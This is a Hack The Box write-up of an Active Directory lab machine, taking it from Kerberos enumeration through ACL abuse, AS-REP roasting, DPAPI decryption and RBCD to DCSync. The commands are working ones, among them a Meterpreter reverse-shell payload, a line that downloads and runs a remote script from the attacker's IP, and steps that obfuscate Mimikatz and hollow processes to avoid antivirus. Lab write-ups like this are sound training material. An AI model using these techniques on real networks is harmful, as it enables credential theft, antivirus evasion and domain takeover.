This is my comprehensive walkthrough for solving **Vintage**, a challenging Active Directory machine on Hack The Box. This machine was full of Kerberos authentication, ticket manipulation, and meticulous troubleshooting, making it an excellent learning experience for real-world AD exploitation.

The journey began in an **assume-breach scenario**, with valid domain user credentials in hand. Unlike many environments, NTLM authentication was disabled, leaving only Kerberos authentication available. Through enumeration, we identified the existence of **Pre-Windows 2000 Compatible Access group**, whose users’ passwords were based on their names. By abusing this, we were able to compromise the password for a machine account **FS01$**, which belonged to the **DOMAIN COMPUTERS** group which had the **ReadGMSAPassword** privilege for the **GMSA01$** account. Using this, we extracted the hash of GMSA01$.

The **GMSA01$** account had **GenericWrite** permissions over the **DOMAIN COMPUTERS** group, which, in turn, had **GenericAll** access over three service accounts. After obtaining and cracking the service account hashes, we identified the password for **SQL_SVC**. By performing password spraying, we discovered that **C.Neri** was reusing the same password.

**C.Neri** was a member of the **REMOTE MANAGEMENT USERS** group. Through further enumeration, we identified a **DPAPI blob** and cracked it using the master key. This yielded credentials for **C.Neri_adm**, who had **GenericWrite** access over the **DELEGATEDADMINS** group. This group was configured with the **AllowedToAct** privilege on the **DC01.vintage.htb** machine.

Abusing **Resource-Based Constrained Delegation (RBCD)**, we leveraged the **DELEGATEDADMINS** group’s privileges to impersonate a high-privilege account on **DC01.vintage.htb**. This machine, in turn, had **DCSync** privileges over the **vintage.htb** domain, allowing us to extract all domain hashes and achieve complete control.

This machine required careful planning, step-by-step execution, and thorough understanding of Kerberos, RBCD, and privilege escalation techniques. Let’s dive into the details!

## Reconnaissance
### Network Scanning:

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*VUrdZEan68EQ9Ovzdo9axQ.png)

The Nmap scan reveals that the target is a Windows Active Directory environment with services like Kerberos (port 88), LDAP (ports 389 and 3268), and SMB (port 445). The domain appears to be `vintage.htb`, and the host is identified as DC01, likely a domain controller.

Key areas we would focus on next include enumerating LDAP for user and group information, checking SMB for accessible shares, and leveraging Kerberos for possible ticket-based attacks.

Let’s start adding domain to the hosts file for local resolution

```bash
echo '10.10.11.45  vintage.htb  dc01.vintage.htb' | sudo tee -a /etc/hosts
```

### Checking if the credentials we have valid for any of the services

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*-lfBEm3vf8x-fBpo98tOfw.png)

There is something wrong credentials doesn’t work for any of the services and giving us `STATUS_NOT_SUPPORTED` , checking other tools `wmiexec` same error

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tQfjY93dHK2xp66aRwczRw.png)

After some searching, found out this means the machine doesn’t allow NTLM auth, so we have to use Kerberos.

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*vZYzVT3f_LEOolKSFRGnvw.png)
_https://gist.github.com/mpgn/9fc08b0f0fde55e8c322518bc1f9c317_

#### Requesting a TGT ticket using the credentails we have
```bash
getTGT.py vintage.htb/'P.Rosa':'Rosaisbest123'
export KRB5CCNAME=P.Rosa.ccache
```
checking the services with the ticket we have and yeah it is working
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*xTygJkvuJcoz2F7dcCNcCw.png)

1. As Kerberos is time-sensitive, ensure the time on the attacking machine is synchronized with the target: `sudo ntpdate -u 10.10.11.45`
2. To streamline Kerberos operations, the /etc/krb5.conf file must be configured by modifying the file directly.
    ```bash 
    [libdefaults]
        default_realm = VINTAGE.HTB

    [realms]
        VINTAGE.HTB = {
            kdc = dc01.vintage.htb
            admin_server = dc01.vintage.htb
        }

    [domain_realm]
        .vintage.htb = VINTAGE.HTB
        vintage.htb = VINTAGE.HTB
    ```
    Alternatively, use the interactive tool
    ```bash
    sudo apt install krb5-user
    sudo dpkg-reconfigure krb5-config
    ```


### Service Enumeration:

#### 1. SSL/TLS Certificate
Port 3269 is commonly used for LDAP over TLS/SSL The tcpwrapped state indicates the port is open but not providing detailed service information so let's start by checking it.

```bash
openssl s_client -connect 10.10.11.45:3269 -showcerts
```

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*jvfWyXAU39SLIuIM2w_t2g.png)

It is open but did not respond to SSL/TLS handshake attempts. The lack of a peer certificate and handshake completion suggests that the service is either non-functional, filtered, or restricted. Nothing important for us.

#### 2. LDAP

To enumerate LDAP on this machine, you can extract all LDAP data using the ldapsearch
```bash
ldapsearch -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w 'Rosaisbest123' -b "DC=vintage,DC=htb" | tee -a ldap.data
```

If you’re looking for specific attributes, you can use LDAP queries with search filters. For example, to list all user account names:

```bash
ldapsearch -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w 'Rosaisbest123' -b "DC=vintage,DC=htb" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | cut -d ':' -f 2 | sed 's/^[[:space:]]*//' | grep -v '^$' | tail -n +2 | tee -a users.list
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*7sPHYtsYiHROWc7rUOlLcA.png)

Store these valid users; we will need them later.

For a more organized and categorized output, use `ldapdomaindump` to create a visual and structured representation of the data:
```bash
ldapdomaindump -u 'vintage\P.Rosa' -p 'Rosaisbest123'  -o dump/ ldap://10.10.11.45 -at SIMPLE
```
+ List of domain users
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*kThVGpXi2ctv4iUMQynWEw.png)

+ Privileged accounts

    LDAP enumeration reveals privileged accounts such as **`L.Bianchi_adm`** and **Administrator**, both members of the **Domain Admins** group with passwords set to never expire, making them high-value targets for privilege escalation. Additionally, the user **`C.Neri_ad`**, found under the **DelegatedAdmins** group, may also be a valuable target for further exploitation.
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*1h01xOeHg3YObyS7wl1o0Q.png)


+  Computer accounts

    Computer accounts, including `fs01`,`DC01` running Windows Server 2022 with trusted delegation enabled, and `gMSA01`, a potential Group Managed Service Account (gMSA). If we compromise an account with sufficient privileges, we can retrieve the gMSA's password.
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*vwyvPqsxlCoYXG0mt5pVhA.png)

+ Groups of Interest

    The `ServiceManagers` group contains accounts like `C.Neri`, `G.Viola`, and `L.Bianchi they might have elevated privileges or access to manage critical services, making them valuable targets for further exploitation.
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*a74f46GSZtZ_W68oFgS1EA.png)

    There is `Pre-Windows 2000 Compatible Access group` which may exploited later for gaining initial foothold
    ![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*vvYK6mPGLcP8a9hKwZrK-g.png)


#### 3. SMB
Checking Credentials with SMB, but it gave us another error
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*F-gJe3dJdGxLMOZwAYKhbg.png)

I tried using the machine IP but with error again, kerberos protocol doesn’t work with IPs
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*JTZV6dpn63NG9kAiyB9TGg.png)

While running the tool in the debug mode If found a domain resolution issue when using `vintage.htb`
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Ky3vHbjGRQXy_petdMPZJA.png)

But when trying the FQDN it works well
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*0bI0tVWSKrWIyzBzpItJiA.png)

Now we can use `spider_plus` module to enumerate shares
```bash 
nxc smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k -M spider_plus
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*6InGvxLhl53wIrGtkEQS8g.png)
No Custom shares and we have Read Permissions on Default Shares with no important data.
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*At5dTrFPCw1Z7D7FOep14w.png)

If you want to check, you can use smbclient
```bash
smbclient.py -k vintage.htb/P.Rosa:Rosaisbest123@dc01.vintage.htb
```
If any errors happened you can use
```bash
smbclient.py -k vintage.htb/P.Rosa:Rosaisbest123@dc01.vintage.htb -dc-ip dc01.vintage.htb
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*fnBlXfBKSRtb9VMDgNi0rw.png)

We could use SMB with `-rid-brute` for user and groups rid bruteforce to collect valid machine accounts but we have gathered them before from LDAP
```bash
nxc smb dc01.vintage.htb -d vintage.htb -u P.Rosa -k --use-kcache --rid-brute | grep SidTypeUser | cut -d: -f2 | cut -d \\ -f2 | cut -d' ' -f1
```
## Exploitation
### Using Bloodhound to visualize environment structure

Since we do not have direct access to any machine, we use the BloodHound Python ingestor to gather information about the domain.
```bash
bloodhound-python -d vintage.htb -c All -ns 10.10.11.45 --zip -u 'P.Rosa' -p 'Rosaisbest123' -k
```
or using `netexc`
```bash
nxc ldap dc01.vintage.htb -d vintage.htb -u P.Rosa -p Rosaisbest123 -k --bloodhound --collection All --dns-server 10.10.11.45
```
However, after analyzing the collected data, no significant attack paths are identified using the current user’s privileges.

### Targeting Pre-Windows 2000 Computers

From the enumeration phase, we identify the presence of the **`Pre-Windows 2000 Compatible Access group`**.
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*qsbQQ7HHuzkUuZJjw4JHBg.png)

We now focus on discovering Pre-Windows 2000 computers.​
> **INFO:**   When a new computer account is configured as `pre-Windows 2000 computer`, its password is set based on its name (i.e. lowercase computer name without the trailing $). When it isn't, the password is randomly generated.
{: .prompt-info }

We can use [pre2k](https://github.com/garrettfoster13/pre2k) to bruteforce computers on the domain, we just need a list of valid accounts to bruteforce them

To identify Pre-Windows 2000 computers and attempt to access them, we use the pre2k tool with a list of valid domain accounts we gathered before. This allows us to brute-force the machine account passwords.

```bash
pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile users.list
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*gpJwmVYdqM04Kd6qpNQx2w.png)

The attack is successful, and we gain access to the `FS01$` machine account.

Marking `FS01$` as Owned in bloodhound, After obtaining access to the `FS01$` machine account, we analyze potential attack paths using BloodHound.

### ACL abuse 
#### ReadGMSAPassword
The analysis reveals that `FS01$` is a member of the `DOMAIN COMPUTERS` group, which has the **`ReadGMSAPassword`** privilege on the **GMSA01$** Group Managed Service Account (GMSA).
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*tm5TRqgkImTOOfKopF7FqQ.png)

> **INFO:**   GMSA01$ Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval
{: .prompt-info }


Using the **bloodyAD** with `FS01$` ticket, to query the domain for the `msDS-ManagedPassword` attribute of the `GMSA01$` account. This attribute stores the encrypted password for the GMSA

```bash
bloodyAD --host dc01.vintage.htb --domain "vintage.htb" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword
```

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*NCzZ1yngUzn_t_LV3RwIiA.png)


The attack is successful, and we extract the hash of the `GMSA01$` account.

With the hash of the `GMSA01$` account, we can obtain a TGT for the account and export it.

```bash
getTGT.py vintage.htb/'GMSA01$' -hashes aad3b435b51404eeaad3b435b51404ee:7dc430b95e17ed6f817f69366f35be06
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*OJjmV0aB_wjuauPUlkycpw.png)

#### GenericWrite over a Group 

Returning to BloodHound after obtaining a TGT for `GMSA01$`, we identified that:

1. **`GMSA01$`** has `GenericWrite` access over the SERVICEMANAGERS group.
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*O4uolcRRwXotG5fdm8CSqw.png)
2. The **`SERVICEMANAGERS`** group holds `GenericAll` permissions over three service accounts
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*4Cg9XoyDlB067yj2NhpMnA.png)

To exploit this chain, we can add our controlled user, `P.Rosa`, to the **SERVICEMANAGERS**. This provides `P.Rosa` with `GenericAll` permissions over the three `SVC` accounts.

Using bloodyAD to add P.Rosa to the group
```bash
bloodyAD  --host dc01.vintage.htb --domain vintage.htb --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"
```
To confirm the addition, we query the members of the group
```bash
bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k get object "SERVICEMANAGERS" | grep 'P.Rosa'
```
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*RyEYbG2SiwZ2kBSwT27yXQ.png)
Once `P.Rosa` is added to the group, we have to request a new TGT for P.Rosa to reflect the updated permissions
```bash
getTGT.py vintage.htb/'P.Rosa':'Rosaisbest123'
export KRB5CCNAME=P.Rosa.ccache
```

#### **`GenericAll`** over Service account  

With the **GenericAll** permissions over the `SVC` accounts, we can:

1. Directly change the account passwords to gain control of their accounts.
2. Add the `DONT_REQ_PREAUTH` attribute to enable AS-REP Roasting, allowing us to retrieve their hashes for offline cracking and identify their plaintext passwords for password spraying across the domain.

After analysis, the `SVC` accounts do not provide direct attack paths in BloodHound. Therefore, instead of Force Changing their Passwords, it is more effective to attempt password spraying with the retrieved credentials to identify other attack paths.

##### AS-REP hashes

Starting adding the DONT_REQ_PREAUTH attribute to enable AS-REP Roasting
```bash
bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
```
![](https://cdn-images-1.medium.com/max/1000/1*VNGh8l9JkAUbtdEMAEy91w.png)

Then Requesting user accounts hashes using
```bash
kerbrute_linux_amd64 userenum --dc 10.10.11.45 -d vintage.htb users.list
```
![](https://cdn-images-1.medium.com/max/1000/1*Y9mSjuuE1U29AuSfLJW4FA.png)
OR
```bash
GetNPUsers.py -request -outputfile hashes.txt -format hashcat -usersfile users.list vintage.htb/
```
![](https://cdn-images-1.medium.com/max/1000/1*7JbBkSf2QxlQ6c8BbOL19A.png)
Start cracking the obtained hashes with hashcat
```bash
hashcat hashes.txt /usr/share/wordlists/rockyou.txt --force
```
Unfortunately hashcat finished without cracking any of the both obtained hashes

![](https://cdn-images-1.medium.com/max/1000/1*71lzsZEj1JLy9Iy3B807GQ.png)

Hashes for `SVC_ARK` and `SVC_LDAP` were obtained, but `SVC_SQL` was missing.

Checking BloodHound revealed that `SVC_SQL` was disabled.

![](https://cdn-images-1.medium.com/max/1000/1*EcC-iUlxNKlheSCaUglBUw.png)

To enable the `SVC_SQL` account
```bash
bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
```
![](https://cdn-images-1.medium.com/max/1000/1*VPZ8g5AilsTk1TDMkCeDeg.png)

Reattempting AS-REP Roasting Once the `SVC_SQL` account was enabled, hashes were successfully retrieved

![](https://cdn-images-1.medium.com/max/1000/1*4waKp80ygSMCLllq21th6g.png)

Hash has successfully cracked

![](https://cdn-images-1.medium.com/max/1000/1*cbl82kgR7Xs58u7eJC5EIA.png)

Spraying the obtained password on the list of valid users we have
```bash
kerbrute_linux_amd64 passwordspray --dc 10.10.11.45 -d vintage.htb users.list  Zer0the0ne 
```
![](https://cdn-images-1.medium.com/max/1000/1*W4mCIO9zTcf4RXk9R7hp7A.png)
We Found a valid user from spraying

## Privilege Escalation
We have User `C.Neri` credentials, Start by requesting a TGT for this user

![](https://cdn-images-1.medium.com/max/1000/1*p7zbARapG7CSW1nfxJtIow.png)

`C.Neri` is member of the `REMOTE MANAGEMENT USERS` group so we can try use Evil-WinRM to access it

1. First request a ticket
    ```bash
    getTGT.py vintage.htb/C.Neri:Zer0the0ne 
    export KRB5CCNAME=C.Neri.ccache    
    ```

2. Then use `Evil-WinRM` for access

    ```bash
    evil-winrm -i dc01.vintage.htb -r vintage.htb
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*OyAyR7ePiaSeV6PU5Mxnxw.png)

You could keep using Evil-WinRM, but it isn’t stable on this machine, especially for heavy enumeration and the presence of antivirus. You might need to switch to another shell or use Meterpreter.

![](https://cdn-images-1.medium.com/max/1000/1*OIf5TgWhAAFKy009pQGXRA.png)

Using [DynWin32-ShellcodeProcessHollowing.ps1](https://gist.githubusercontent.com/qtc-de/1ecc57264c8270f869614ddd12f2f276/raw/c5810a377af12b21629f25cd60b2e9c42713b8e8/DynWin32-ShellcodeProcessHollowing.ps1), This script performs shellcode-based process hollowing by injecting shellcode into a trusted process (svchost.exe) using dynamic Win32 API lookups. This technique bypasses antivirus detection while ensuring stealth and execution stability.

1. Generate the shell code using `msfvenom`
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.75 LPORT=4444 -f psh
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*jEQ_eneMM-kNVLTHbj_ajg.png)
    We just need the shellcode itself: 0xfc,0x48,..,0xff,0xd5

2. Adjusting the powershell shellcode

    Download this script [DynWin32-ShellcodeProcessHollowing.ps1](https://gist.githubusercontent.com/qtc-de/1ecc57264c8270f869614ddd12f2f276/raw/c5810a377af12b21629f25cd60b2e9c42713b8e8/DynWin32-ShellcodeProcessHollowing.ps1) and place the generated shellcode from the previous step into the $SHELLCODE byte array.
    ![](https://cdn-images-1.medium.com/max/750/1*aWsy8eCJiKcTP7OKQ8HJ6g.png)
    ![](https://cdn-images-1.medium.com/max/1000/1*ghGXK3KpKzdXQDXhx-c9TA.png)
3. Start the Python server
    ```bash
    sudo python3 -m http.server 80
    ```
4. Start Metasploit C2 server
    ```bash
    msfconsole -x "use exploits/multi/handler; set lhost 10.10.16.75; set lport 4444; set payload windows/x64/meterpreter/reverse_tcp; exploit"
    ```

4. Execute the shellcode:

    In Evil-WinRM, download and trigger the shell.
    ```powershell
    powershell "IEX(new-object System.Net.WebClient).Downloadstring('http://10.10.16.75:80/shell.ps1')"
    ```

    ![](https://cdn-images-1.medium.com/max/1000/1*HCXqXe8wOctUh0bPY_mHdA.png)

    We got shell

### Extracting DPAPI Backup Keys

After some time searching for a lead and manually enumerating the machine (as I couldn’t run most of the known tools due to the presence of antivirus blocking and deleting them if they touched the disk), I found encrypted DPAPI-related files under the `C:\Users\C.Neri\AppData\` directory.

#### Data Protection API (DPAPI)
On Windows, credentials stored in the Windows Credentials Manager are encrypted using Microsoft’s Data Protection API (DPAPI) and saved as “blob” files within the user’s AppData folder.
Within a domain, the domain controller’s master key is used to encrypt these blobs. By extracting the private key from the domain controller, it is possible to decrypt all the blobs, thereby recovering all the secrets stored in the Windows Credentials Manager across all workstations in the domain.

#### Two things needed for this process

1. Master Key
    Get-ChildItem C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
    ![](https://cdn-images-1.medium.com/max/1000/1*EICJrYjO5A4U54ZT-YuuXA.png)
2. The blob or the backup
    ```bash
    Get-ChildItem -Hidden C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\
    Get-ChildItem -Hidden C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*rtxmsmfA_ItOb_w2U01jEQ.png)
We need the Master Key to decrypt the blob and extract the secrets stored within. To extract the Master Key, we need valid credentials for the user.

There are several ways to do this: using [Mimikatz](https://github.com/gentilkiwi/mimikatz), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), or by downloading the files locally and using [dpapi.py](https://github.com/fortra/impacket/blob/master/examples/dpapi.py) from Impacket to decrypt everything. The last option is the most reliable at the moment, as it won’t interact with the disk, ensuring the antivirus doesn’t interfere with our work.

I would Mention Both ways for more knowledge

#### 1. Offline Cracking

We need to obtain the files and transfer them to our machine.

+ Download DPAPI-protected blobs:
    To find the DPAPI-protected blobs
    ```powershell
    Get-ChildItem -Hidden C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*MhXgJK6MphNXB8y-XL5CNA.png)
    These files are hidden, so we need to change the file permissions to be able to download them
    ```powershell

    ```
    You can download them directly if you’re using Evil-WinRM or the Meterpreter shell
    ```powershell
    cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
    download C4BB96844A5C9DD45D5B6A9859252BA6
    ```
    If you're using a limited shell, you can use Netcat, `Invoke-WebRequest`, or create an SMB server and copy the files there.

#### 2. Using Mimikatz

If you have an obfuscated version of Mimikatz, you can use it directly. If not, it’s essential to learn how to obfuscate your tools for later use. For now, we will use [RingQ](https://github.com/T4y1oR/RingQ.git) to automate the process, as heavy obfuscation is not necessary at this stage.

+ Download the Tool from github
+ Place Mimikatz.exe in the same folder as the tool.
+ Use Create.exe to create the obfuscated payload to evade detection.

    ![](https://cdn-images-1.medium.com/max/1000/1*zv3pA-4rOUxjfovq-lVZ3g.png)
    Once tested and confirmed to be working, proceed with uploading the files.
    ![](https://cdn-images-1.medium.com/max/1000/1*ewLjPQGQA9HKcTStkvHYww.png)

+ Upload the loader and the `main.txt` file to the machine.

    Ensure both the loader and obfuscated code are in the same directory.
    ```
    upload /htb/Vintage/www/RingQ.exe
    upload /htb/Vintage/www/main.txt
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*1nsByDFu-v0W7RvMAGLvRw.png)
+ Run the loader to load the executable.
    ![](https://cdn-images-1.medium.com/max/1000/1*wEoAdPP3alpfKruoV_9EKA.png)
+ Decrypt the Master Key

    To decrypt the master key, use the following Mimikatz command:
    ```
    dpapi::masterkey /in:C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 /sid:S-1-5-21-4024337825-2033394866-2055507597-1115 /password:Zer0the0ne /protected
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*z8IxFWJeqHrmVL2H-7lidA.png)

+ Decrypt the DPAPI Blob

    To decrypt the DPAPI blob, use the following command:
    ```
    dpapi::cred /in:C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6 /masterkey:f8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
    ```

We now have credentials for `C.Neri_adm` blob, Test these creds.
![](https://cdn-images-1.medium.com/max/1000/1*ruXPQSlIiSK1X_YPCWaLPw.png)

Mark this user as **Owned** in BloodHound and analyze the possible attack paths.

![](https://cdn-images-1.medium.com/max/1000/1*gWGPl106Wb939pSVZ6aJCQ.png)

### ACL Abuse 

Our user has **GenericWrite** and **AddSelf** DACL privileges over the **DELEGATEDADMINS** group. This group has the **AllowedToAct** privilege on the **DC01.vintage.htb** machine, which in turn has **DCSync** privileges over the **vintage.htb** domain.

![](https://cdn-images-1.medium.com/max/1000/1*VMtbQuA3643s2xT2EPWfAA.png)

To exploit the **AllowedToAct** privilege, we can abuse **Resource-Based Constrained Delegation (RBCD)** by forging a TGS. This allows us to execute a modified **S4U2self / S4U2proxy** abuse chain to impersonate an administrative user on the target system and obtain a valid service ticket “as” that user.

![](https://cdn-images-1.medium.com/max/1000/1*867Y87tWKrUhpnVxWwJI8A.png)

The **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute is used to specify which security principals (users, computers, or groups) are allowed to impersonate other users or services on behalf of another identity.

It is critical to note that the principal added to the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** DACL must have an **`SPN`** set in order to successfully abuse the S4U2self/S4U2proxy process.

For this, we can leverage the **`SQL_SVC`** account as we already have its credentials, and we can easily configure its SPN.

#### The steps for the attack are as follows:

1. Using P.Rosa priv as we added to SERVICEMANAGERS group, Add SPN to the SQL_SVC user account 
    
    We know from before it is disabled and there are clean up script running on the machine so we have to redo this once more quickly

    Note: We have to do all steps quickly one by one and take care of the ticket of have and which user has the priv

    ```bash 
    # Enabling SVC_SQL account
    bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
    #Set servicePrincipalName for SVC_SQL
    bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k set object 'SVC_SQL' servicePrincipalName -v 'cifs/sql'
    ```

2. Request **`C.Neri_adm`** TGT

3. Add `sql_svc` user to the `DELEGATEDADMINS` group using the `GenericWrite` permissions of `C.Neri_adm`.

    ```bash
    bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*i7dkhy7qLam8pakUMbvlpw.png)
4. Request a `TGT` for `sql_svc` inheriting the newly assigned `AllowedToAct` privilege.

5. Abuse `RBCD` by forging a **TGS ticket** to impersonate a high-privilege administrative user.

    We have two users in the **Domain Admins** group: **`Administrator`** and **`L.BIANCHI_ADM`**. If one user’s ticket does not work, we can attempt the other.
    ![](https://cdn-images-1.medium.com/max/1000/1*LErwvxcIk5I7_UbkH8h3Fw.png)

    + To request a TGS impersonating the **`Administrator`**:
        ```bash
        getST.py -dc-ip 10.10.11.45 -spn 'cifs/dc01.vintage.htb' -impersonate Administrator -k 'vintage.htb/svc_sql:Zer0the0n'
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*-23O3UqycSsxLzMI9EVI-A.png)
    + To request a TGS impersonating **`L.BIANCHI_ADM`**
        ```bash
        getST.py -dc-ip 10.10.11.45 -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -k 'vintage.htb/svc_sql:Zer0the0n'
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*1jUDKdM8sEVAdEmQRx-78Q.png)
6. Execute a DCSync attack to extract domain hashes

    Once we have impersonated a high-privilege user, use the forged TGS to perform a **DCSync** attack.
    ```bash
    secretsdump.py -k dc01.vintage.htb
    ```
    ![](https://cdn-images-1.medium.com/max/1000/1*LwGK8LV8B8d_0mdaaVPkVA.png)
    ![](https://cdn-images-1.medium.com/max/750/1*Lbz_LfX0VfScvVr2i-3-bw.png)

7. Connect to the target machine

    After testing, the **Administrator** ticket or hash could not be used for remote shell access, as it lacks remote management privileges. Instead, we can use the **L.BIANCHI_ADM** ticket to gain access.
    + Using wmiexec
        ```bash
        wmiexec.py -k -no-pass L.BIANCHI_ADM@dc01.vintage.htb -dc-ip 10.10.11.45
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*4n9n5oBVf6BHJrWKf1cqRQ.png)
        ![](https://cdn-images-1.medium.com/max/1000/1*bGGy73GcVrAy4Oub8TXBlQ.png)

    + Or using smbexec

        ```bash
        smbexec.py -k -no-pass L.BIANCHI_ADM@dc01.vintage.htb -dc-ip 10.10.11.45
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*L-xoKQR81KcRIx7Zal0YsA.png)
        ![](https://cdn-images-1.medium.com/max/1000/1*HYliUhyIS9oe9wVyVPmeUw.png)

    + If you prefer to use **Evil-WinRM**, you must request a service ticket for HTTP instead of CIFS

        ```bash
        getST.py -dc-ip 10.10.11.45 -spn 'HTTP/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -k 'vintage.htb/svc_sql:Zer0the0n'
        ```
        ![](https://cdn-images-1.medium.com/max/1000/1*7PBa0qZQLbO9QDbpW9yN2w.png)


**The entire process must be executed quickly, one step after another, to ensure success and maintain consistency across the attack phases. If any errors occur during the process, follow these steps to troubleshoot:**

1. Verify for whom the exported Kerberos ticket using klist.
2. Check the krb5 configuration.
3. Kerberos only works with the FQDN so you have to use it like dc01.vintage.htb
4. Ensure there is no significant time difference between your local machine and the target system.
5. If issues persist, consider requesting a reset of the target machine to restore its state.

Additionally, I’ve created a script to automate the entire attack process. You can find it here: [vintage.htb](https://github.com/Zyad-Elsayed/vintage.htb)
